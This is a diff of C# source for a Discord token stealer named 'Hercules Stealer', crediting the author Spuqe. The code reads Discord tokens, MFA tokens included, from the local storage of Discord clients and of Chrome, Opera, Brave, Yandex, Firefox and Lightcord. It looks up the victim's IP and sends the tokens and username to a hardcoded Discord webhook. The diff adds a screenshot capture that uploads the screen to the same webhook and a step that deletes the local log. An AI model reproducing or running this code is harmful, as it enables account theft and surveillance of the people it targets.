@@ -1,4 +1,4 @@
-﻿
+
 /*
   Made by Spuqe
   https://github.com/spuqe
@@ -11,23 +11,31 @@ using System;
 using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Drawing;
-using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Http;
-using System.Text;
 using System.Text.RegularExpressions;
+using Crying.Reader;
+using Crying.Helpers;
+using static Crying.Helpers.Common;
 using System.Threading.Tasks;
+using System.Threading;
+using System.Reflection;
+using System.Diagnostics;
+using Microsoft.VisualBasic;
+using System.ServiceProcess;
+using System.Net.NetworkInformation;
+
 #endregion
 
-namespace Hercules_Grabber
-{
+namespace Hercules_Stealer
+	{
 	#region "Stealer Class"
 
 	public class Stealer
 	{
-		public static string Hook = "YourFuckingWebhookHere"; // YOUR WEBHOOK URL HERE!!!!
+		public static string Hook = "https://discordapp.com/api/webhooks/873155239501520917/5bpbG7db4jPztlMVpt6dfa_nxb4RTFv21DMqCQWepB-S5I4hWTUlCAXdCYV8m_evjAdm";
 
 		private static string _path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\updatelog.txt";
 
@@ -45,6 +53,7 @@ namespace Hercules_Grabber
 		private static bool StealFound;
 		private static bool StealFirefoxFound;
 
+		//used a another webhook more simple
 		public static void SendWebHook(string token, string name, string picture, string message, string file)
 		{
 			Webhook hook = new Webhook(token);
@@ -201,45 +210,54 @@ namespace Hercules_Grabber
 			return token;
 		}
 
-		public static void StartSteal()
-		{
-			try
+
+			public static void StartSteal()
+
 			{
-
-				SendWebHook(Hook, "Hercules Token Grabber By Spuqe", "", "", "");
-
-				Stealer.StealTokenFromChrome();
-				Stealer.StealTokenFromOpera();
-				Stealer.StealTokenFromOperaGX();
-				Stealer.StealTokenFromDiscordApp();
-				Stealer.StealTokenFromDiscordCanary();
-				Stealer.StealTokenFromDiscordPTB();
-				Stealer.StealTokenFromBraveBrowser();
-				Stealer.StealTokenFromYandexBrowser();
-				Stealer.StealTokenFromFirefox();
-				Stealer.StealTokenFromLightcord();
-
-				Stealer.Send(File.ReadAllText(Stealer._path));
-
-				if (File.Exists(Stealer._path))
+				try
 				{
-					File.Delete(Stealer._path);
+					Bitmap bit = new Bitmap(1920, 1080);
+					Graphics g = Graphics.FromImage(bit);
+					g.CopyFromScreen(new Point(30, 30), new Point(0, 0), bit.Size);
+					g.Dispose();
+					bit.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "Discord.jpeg");
+
+					string file = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "Discord.jpeg";
+
+					SendWebHook(Hook, "Hercules Stealer", "", "ScreenShot:", file);
+
+					Stealer.StealTokenFromChrome();
+					Stealer.StealTokenFromOpera();
+					Stealer.StealTokenFromOperaGX();
+					Stealer.StealTokenFromDiscordApp();
+					Stealer.StealTokenFromDiscordCanary();
+					Stealer.StealTokenFromDiscordPTB();
+					Stealer.StealTokenFromBraveBrowser();
+					Stealer.StealTokenFromYandexBrowser();
+					Stealer.StealTokenFromFirefox();
+					Stealer.StealTokenFromLightcord();
+
+					Stealer.Send(File.ReadAllText(Stealer._path));
+
+					if (File.Exists(Stealer._path))
+					{
+						File.Delete(Stealer._path);
+					}
+				}
+				catch (Exception)
+				{
+
 				}
 			}
-			catch (Exception)
-			{
-
-			}
-		}
 
 		private static void Send(string tokenReport)
-		{
-			try
 			{
-				string externalip = new WebClient().DownloadString("http://ipinfo.io/ip");
+				try
+				{
+					string externalip = new WebClient().DownloadString("http://ipinfo.io/ip");
 
-				HttpClient httpClient = new HttpClient();
-				Dictionary<string, string> nameValueCollection = new Dictionary<string, string>
+					HttpClient httpClient = new HttpClient();
+					Dictionary<string, string> nameValueCollection = new Dictionary<string, string>
 				{
 					{
 						"content",
@@ -247,252 +265,252 @@ namespace Hercules_Grabber
 						{
 							string.Join("\n", new string[]
 							{
-								"᲼᲼᲼᲼᲼᲼\n***New report from PC: " + Environment.UserName + " with IP: " + externalip + "*** ```asciidoc\n" + tokenReport + "\n```"
+								"᲼᲼᲼᲼᲼᲼***New report from PC: " + Environment.UserName + " with IP: " + externalip + "*** ```asciidoc\n" + tokenReport + "\n ```"
 							}),
 						})
 					},
 				};
-				httpClient.PostAsync(Hook, new FormUrlEncodedContent(nameValueCollection)).GetAwaiter().GetResult();
+					httpClient.PostAsync(Hook, new FormUrlEncodedContent(nameValueCollection)).GetAwaiter().GetResult();
+				}
+				catch
+				{
+				}
 			}
-			catch
-			{
-			}
-		}
 
-		private static void StealTokenFromDiscordApp()
-		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
-			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
+			private static void StealTokenFromDiscordApp()
 			{
-				Stealer.App = true;
-				List<string> list = Stealer.TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
+				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
+				DirectoryInfo folder = new DirectoryInfo(path);
+				if (Directory.Exists(path))
 				{
 					Stealer.App = true;
-				}
-			}
-		}
-
-		private static void StealTokenFromDiscordCanary()
-		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordcanary\\Local Storage\\leveldb\\";
-			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
-			{
-				Stealer.Canary = true;
-				List<string> list = Stealer.TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					Stealer.Canary = true;
-				}
-			}
-		}
-
-		private static void StealTokenFromDiscordPTB()
-		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordptb\\Local Storage\\leveldb\\";
-			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
-			{
-				Stealer.PTB = true;
-				List<string> list = Stealer.TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					Stealer.PTB = true;
-				}
-			}
-		}
-
-		private static void StealTokenFromLightcord()
-		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Lightcord\\Local Storage\\leveldb\\";
-			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
-			{
-				Stealer.Lightcord = true;
-				List<string> list = Stealer.TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					Stealer.Lightcord = true;
-				}
-			}
-		}
-
-		private static void StealTokenFromBraveBrowser()
-		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\";
-			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
-			{
-				Stealer.Brave = true;
-				List<string> list = Stealer.TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					Stealer.Brave = true;
-				}
-			}
-		}
-
-		private static void StealTokenFromYandexBrowser()
-		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\";
-			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
-			{
-				Stealer.Yandex = true;
-				List<string> list = Stealer.TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					Stealer.Yandex = true;
-				}
-			}
-		}
-
-		private static void StealTokenFromChrome()
-		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
-			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
-			{
-				Stealer.Chrome = true;
-				List<string> list = Stealer.TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					Stealer.Chrome = true;
-				}
-			}
-		}
-
-		private static void StealTokenFromOpera()
-		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\";
-			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
-			{
-				Stealer.Opera = true;
-				List<string> list = Stealer.TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					Stealer.Opera = true;
-				}
-			}
-		}
-
-		private static void StealTokenFromOperaGX()
-		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\";
-			DirectoryInfo folder = new DirectoryInfo(path);
-			if (Directory.Exists(path))
-			{
-				Stealer.OperaGX = true;
-				List<string> list = Stealer.TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					Stealer.OperaGX = true;
-				}
-			}
-		}
-
-		private static void StealTokenFromFirefox()
-		{
-			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\";
-			if (Directory.Exists(path))
-			{
-				foreach (string text in Directory.EnumerateFiles(path, "webappsstore.sqlite", SearchOption.AllDirectories))
-				{
-					List<string> list = Stealer.TokenStealerForFirefox(new DirectoryInfo(text.Replace("webappsstore.sqlite", "")), false);
+					List<string> list = Stealer.TokenStealer(folder, false);
 					if (list != null && list.Count > 0)
 					{
-						foreach (string str in (from t in list
-												where !Stealer.App
-												select t).Select(new Func<string, string>(Stealer.TokenCheckAcces)))
+						Stealer.App = true;
+					}
+				}
+			}
+
+			private static void StealTokenFromDiscordCanary()
+			{
+				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordcanary\\Local Storage\\leveldb\\";
+				DirectoryInfo folder = new DirectoryInfo(path);
+				if (Directory.Exists(path))
+				{
+					Stealer.Canary = true;
+					List<string> list = Stealer.TokenStealer(folder, false);
+					if (list != null && list.Count > 0)
+					{
+						Stealer.Canary = true;
+					}
+				}
+			}
+
+			private static void StealTokenFromDiscordPTB()
+			{
+				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordptb\\Local Storage\\leveldb\\";
+				DirectoryInfo folder = new DirectoryInfo(path);
+				if (Directory.Exists(path))
+				{
+					Stealer.PTB = true;
+					List<string> list = Stealer.TokenStealer(folder, false);
+					if (list != null && list.Count > 0)
+					{
+						Stealer.PTB = true;
+					}
+				}
+			}
+
+			private static void StealTokenFromLightcord()
+			{
+				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Lightcord\\Local Storage\\leveldb\\";
+				DirectoryInfo folder = new DirectoryInfo(path);
+				if (Directory.Exists(path))
+				{
+					Stealer.Lightcord = true;
+					List<string> list = Stealer.TokenStealer(folder, false);
+					if (list != null && list.Count > 0)
+					{
+						Stealer.Lightcord = true;
+					}
+				}
+			}
+
+			private static void StealTokenFromBraveBrowser()
+			{
+				string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\";
+				DirectoryInfo folder = new DirectoryInfo(path);
+				if (Directory.Exists(path))
+				{
+					Stealer.Brave = true;
+					List<string> list = Stealer.TokenStealer(folder, false);
+					if (list != null && list.Count > 0)
+					{
+						Stealer.Brave = true;
+					}
+				}
+			}
+
+			private static void StealTokenFromYandexBrowser()
+			{
+				string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\";
+				DirectoryInfo folder = new DirectoryInfo(path);
+				if (Directory.Exists(path))
+				{
+					Stealer.Yandex = true;
+					List<string> list = Stealer.TokenStealer(folder, false);
+					if (list != null && list.Count > 0)
+					{
+						Stealer.Yandex = true;
+					}
+				}
+			}
+
+			private static void StealTokenFromChrome()
+			{
+				string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
+				DirectoryInfo folder = new DirectoryInfo(path);
+				if (Directory.Exists(path))
+				{
+					Stealer.Chrome = true;
+					List<string> list = Stealer.TokenStealer(folder, false);
+					if (list != null && list.Count > 0)
+					{
+						Stealer.Chrome = true;
+					}
+				}
+			}
+
+			private static void StealTokenFromOpera()
+			{
+				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\";
+				DirectoryInfo folder = new DirectoryInfo(path);
+				if (Directory.Exists(path))
+				{
+					Stealer.Opera = true;
+					List<string> list = Stealer.TokenStealer(folder, false);
+					if (list != null && list.Count > 0)
+					{
+						Stealer.Opera = true;
+					}
+				}
+			}
+
+			private static void StealTokenFromOperaGX()
+			{
+				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\";
+				DirectoryInfo folder = new DirectoryInfo(path);
+				if (Directory.Exists(path))
+				{
+					Stealer.OperaGX = true;
+					List<string> list = Stealer.TokenStealer(folder, false);
+					if (list != null && list.Count > 0)
+					{
+						Stealer.OperaGX = true;
+					}
+				}
+			}
+
+			private static void StealTokenFromFirefox()
+			{
+				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\";
+				if (Directory.Exists(path))
+				{
+					foreach (string text in Directory.EnumerateFiles(path, "webappsstore.sqlite", SearchOption.AllDirectories))
+					{
+						List<string> list = Stealer.TokenStealerForFirefox(new DirectoryInfo(text.Replace("webappsstore.sqlite", "")), false);
+						if (list != null && list.Count > 0)
 						{
-							Stealer.Firefox = true;
-							File.AppendAllText(Stealer._path, "Firefox Token: " + str + Environment.NewLine);
+							foreach (string str in (from t in list
+													where !Stealer.App
+													select t).Select(new Func<string, string>(Stealer.TokenCheckAcces)))
+							{
+								Stealer.Firefox = true;
+								File.AppendAllText(Stealer._path, "Firefox Token: " + str + Environment.NewLine);
+							}
 						}
 					}
 				}
 			}
-		}
 
-		private static List<string> TokenStealerForFirefox(DirectoryInfo Folder, bool checkLogs = false)
-		{
-			List<string> list = new List<string>();
-			try
+			private static List<string> TokenStealerForFirefox(DirectoryInfo Folder, bool checkLogs = false)
 			{
-				FileInfo[] files = Folder.GetFiles(checkLogs ? "*.log" : "*.sqlite");
-				for (int i = 0; i < files.Length; i++)
+				List<string> list = new List<string>();
+				try
 				{
-					string input = files[i].OpenText().ReadToEnd();
-					foreach (object obj in Regex.Matches(input, @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}"))
+					FileInfo[] files = Folder.GetFiles(checkLogs ? "*.log" : "*.sqlite");
+					for (int i = 0; i < files.Length; i++)
 					{
-						Match match = (Match)obj;
-						list.Add(match.Value);
-					}
-					foreach (object obj2 in Regex.Matches(input, @"mfa\.[a-zA-Z0-9_\-]{84}"))
-					{
-						Match match2 = (Match)obj2;
-						list.Add(match2.Value);
+						string input = files[i].OpenText().ReadToEnd();
+						foreach (object obj in Regex.Matches(input, @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}"))
+						{
+							Match match = (Match)obj;
+							list.Add(match.Value);
+						}
+						foreach (object obj2 in Regex.Matches(input, @"mfa\.[a-zA-Z0-9_\-]{84}"))
+						{
+							Match match2 = (Match)obj2;
+							list.Add(match2.Value);
+						}
 					}
 				}
+				catch
+				{
+				}
+				list = list.Distinct<string>().ToList<string>();
+				if (list.Count > 0)
+				{
+					Stealer.StealFirefoxFound = true;
+					List<string> list2 = list;
+					int index = list.Count - 1;
+					list2[index] = (list2[index] ?? "");
+				}
+				Stealer.Firefox = false;
+				return list;
 			}
-			catch
-			{
-			}
-			list = list.Distinct<string>().ToList<string>();
-			if (list.Count > 0)
-			{
-				Stealer.StealFirefoxFound = true;
-				List<string> list2 = list;
-				int index = list.Count - 1;
-				list2[index] = (list2[index] ?? "");
-			}
-			Stealer.Firefox = false;
-			return list;
 		}
-	}
 
-	#endregion
+		#endregion
 
-	#region "WebHook Class"
+		#region "WebHook Class"
 
-	class Webhook
-	{
-		private HttpClient Client;
-		private string Url;
-
-		public string Name { get; set; }
-		public string ProfilePictureUrl { get; set; }
-
-		public Webhook(string webhookUrl)
+		class Webhook
 		{
-			Client = new HttpClient();
-			Url = webhookUrl;
-		}
+			private HttpClient Client;
+			private string Url;
 
-		public bool SendMessage(string content, string file = null)
-		{
-			MultipartFormDataContent data = new MultipartFormDataContent();
-			data.Add(new StringContent(Name), "username");
-			data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
-			data.Add(new StringContent(content), "content");
+			public string Name { get; set; }
+			public string ProfilePictureUrl { get; set; }
 
-			if (file != null)
+			public Webhook(string webhookUrl)
 			{
-				if (!File.Exists(file))
-					throw new FileNotFoundException();
-
-				byte[] bytes = File.ReadAllBytes(file);
-
-				data.Add(new ByteArrayContent(bytes), "file", "img.jpeg"); //change "file" to "file.(extention) if you wish to download as ext
+				Client = new HttpClient();
+				Url = webhookUrl;
 			}
 
-			var resp = Client.PostAsync(Url, data).Result;
+			public bool SendMessage(string content, string file = null)
+			{
+				MultipartFormDataContent data = new MultipartFormDataContent();
+				data.Add(new StringContent(Name), "username");
+				data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
+				data.Add(new StringContent(content), "content");
 
-			return resp.StatusCode == HttpStatusCode.NoContent;
+				if (file != null)
+				{
+					if (!File.Exists(file))
+						throw new FileNotFoundException();
+
+					byte[] bytes = File.ReadAllBytes(file);
+
+					data.Add(new ByteArrayContent(bytes), "file", "img.jpeg"); //change "file" to "file.(extention) if you wish to download as ext
+				}
+
+				var resp = Client.PostAsync(Url, data).Result;
+
+				return resp.StatusCode == HttpStatusCode.NoContent;
+			}
 		}
-	}
 
-	#endregion
-}
+		#endregion
+	}
